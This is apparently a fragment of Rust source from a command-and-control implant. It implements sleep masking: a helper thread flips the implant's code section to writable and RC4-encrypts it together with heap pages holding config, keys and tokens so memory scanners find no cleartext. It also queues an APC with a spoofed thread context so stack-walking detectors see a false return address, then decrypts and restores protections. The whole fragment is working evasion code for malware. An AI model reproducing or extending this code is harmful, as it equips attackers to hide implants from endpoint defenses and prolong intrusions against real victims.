            param,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() {
        None
    } else {
        Some(h as usize)
    }
}

/// The helper thread entry. Runs ENTIRELY on raw exports (not the indirect
/// runtime) to avoid the single-trampoline race. Sequence:
///   1. NtProtectVirtualMemory(.text, RX->RW)
///   2. RC4-encrypt .text  <- .text is now ciphertext
///   3. Queue APC into the beacon's alertable window:
///      - If spoof_rip is Some (and GetContext succeeded on beacon thread):
///        build a spoofed CONTEXT with RIP = gap address and RSP = beacon's
///        original RSP (from saved_ctx captured by step 4 on the beacon thread
///        before this helper was spawned). Queue via NtContinue APC.
///      - If spoof_rip is None: queue a benign no-op APC to break the sleep.
///   4. NtDelayExecution(secs) — the helper sleeps the mask window
///   5. RC4-decrypt .text     <- .text restored to cleartext
///   6. NtProtectVirtualMemory(.text, RW->RX)
///   7. verify .text[0..16] matches the pre-mask snapshot
///   8. exit (return 0)
///
/// Note: NtGetContextThread / NtSetContextThread are NOT called here — they run
/// on the beacon thread (before this helper spawns and after it joins,
/// respectively) in `execute_foliage_apc`.
///
/// # Safety
/// `param` is a leaked `*mut FoliageParams`. Mutates the implant's `.text`.
unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
    let p: &FoliageParams = unsafe { &*(param as *const FoliageParams) };
    let raw = &p.raw;
    let base = p.text_base;
    let len = p.text_len;

    // 1. .text RX → RW (PAGE_READWRITE = 0x04).
    let mut b = base;
    let mut s = len;
    let mut old: u32 = 0;
    let st1 = unsafe {
        raw.nt_protect_virtual_memory(&mut b, &mut s, 0x04 /* RW */, &mut old)
    };
    if st1 < 0 {
        return 1; // protect failed — abort, .text untouched
    }

    // 2. RC4-encrypt .text + all registered regions + heap slabs in one pass.
    let text = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
    nyx_implant_evasionsdk::foliage::mask_region(&p.key, text);
    // Mask registered sensitive regions + allocator heap pages (config, key,
    // token cache, BOF scratch — everything that would be cleartext in a
    // memory scan during sleep). Uses the same RC4 key as .text.
    crate::mem::mask_heap_regions(&p.key);

    // 3. Queue APC into the beacon's alertable window using the REAL thread
    //    handle (not NtCurrentThread which resolves to the calling thread).
    //
    //    The beacon's original CONTEXT was already saved by NtGetContextThread
    //    on the beacon thread (step 4 of FoliagePlan) BEFORE this helper was
    //    spawned. We read saved_ctx.rsp() to build the spoofed CONTEXT — we
    //    do NOT call NtGetContextThread here (from the helper thread it would
    //    capture the HELPER's register state, not the beacon's).
    let beacon = p.beacon_handle;
    if let Some(rip) = p.spoof_rip {
        // spoof_rip is Some only if GetContext succeeded on the beacon thread
        // (the caller gates it via spoof_rip = None when GetContext fails).
        // Read the beacon's real RSP from the pre-saved CONTEXT.
        let real_rsp = if !p.saved_ctx.is_null() {
            unsafe { (*p.saved_ctx).rsp() }
        } else {
            // Defensive: should not happen (spoof_rip is None when saved_ctx
            // is invalid), but degrade safely to the no-op APC path.
            let _ = unsafe { raw.nt_queue_apc_thread(beacon, apc_noop as usize, 0, 0, 0) };
            return 0;
        };
        // Build spoofed CONTEXT: RIP = gap address, RSP = real stack pointer.
        // This makes stack-walking detectors see the gap address as a return
        // address, while the real RSP keeps the thread from faulting on the
        // first stack access.
        let ctx = unsafe { crate::context::spoofed_context(rip, real_rsp, p.saved_ctx) };
        // NtContinue is resolved on-demand (used only by the helper for the
        // APC, not needed for any other call).
        let ntc =
            crate::resolve::export_addr(b"ntdll.dll", b"NtContinue").unwrap_or(apc_noop as usize);
        let _ = unsafe { raw.nt_queue_apc_thread(beacon, ntc, ctx as usize, 0, 0) };
    } else {
        // No spoof: queue a benign no-op APC just to break the alertable sleep.
        let _ = unsafe { raw.nt_queue_apc_thread(beacon, apc_noop as usize, 0, 0, 0) };
    }

    // 4. Sleep the mask window (helper side). .text stays ciphertext here.
    //    Use NtWaitForSingleObject(INVALID_HANDLE, Alertable=FALSE) instead of
    //    NtDelayExecution to get UserRequest wait-reason (consistent with the
    //    beacon thread's strategy). The helper doesn't need to be alertable (the
    //    APC is queued before the sleep).
    let delay: i64 = -((p.secs as i64).saturating_mul(10_000_000));
    const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
    unsafe { raw.nt_wait_for_single_object(INVALID_HANDLE, 0, &delay as *const i64 as usize) };

    // 5. RC4-decrypt heap regions + registered sensitive data, then .text.
    //    Heap must be unmasked before .text because the beacon thread will
    //    resume executing from .text and may access config/transport buffers.
    crate::mem::unmask_heap_regions(&p.key);
    let text = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
    nyx_implant_evasionsdk::foliage::unmask_region(&p.key, text);

    // 6. .text RW → RX (PAGE_EXECUTE_READ = 0x20).
    let mut b = base;
    let mut s = len;
    let mut old2: u32 = 0;
    let _ = unsafe {
        raw.nt_protect_virtual_memory(&mut b, &mut s, 0x20 /* ER */, &mut old2)
    };

    // 7. Verify the round-trip restored the first 16 bytes.
    if !p.verify.is_null() {
        let v: &VerifyState = unsafe { &*p.verify };
        let mut after = [0u8; 16];
        unsafe { core::ptr::copy_nonoverlapping(base as *const u8, after.as_mut_ptr(), 16) };
        if after == v.before {
            v.ok.store(true, core::sync::atomic::Ordering::Release);
        }
    }
    0
}

/// A no-op APC routine (signature: extern "system" fn(ApcContext1, ApcContext2,
/// ApcContext3) — NtQueueApcThread's 3 user args). Used to wake the beacon's
/// alertable sleep benignly. It executes from its own (helper-provided) context
/// and returns without touching .text.
#[allow(unused_variables)]
unsafe extern "system" fn apc_noop(a1: usize, a2: usize, a3: usize) {
    // Intentionally empty: the APC's purpose is to make the beacon's
    // alertable sleep return (driving the masked-window sequence). The beacon
    // resumes with .text already restored (the helper unmasked before we wake).
}

/// Extract the sleep seconds from the plan's Sleep step.
fn plan_seconds(plan: &FoliagePlan) -> u32 {
    plan.steps
        .iter()
        .find_map(|s| {
            if let FoliageStep::Sleep { seconds } = s {
                Some(*seconds)
            } else {
                None
            }
        })
        .unwrap_or(1)
}
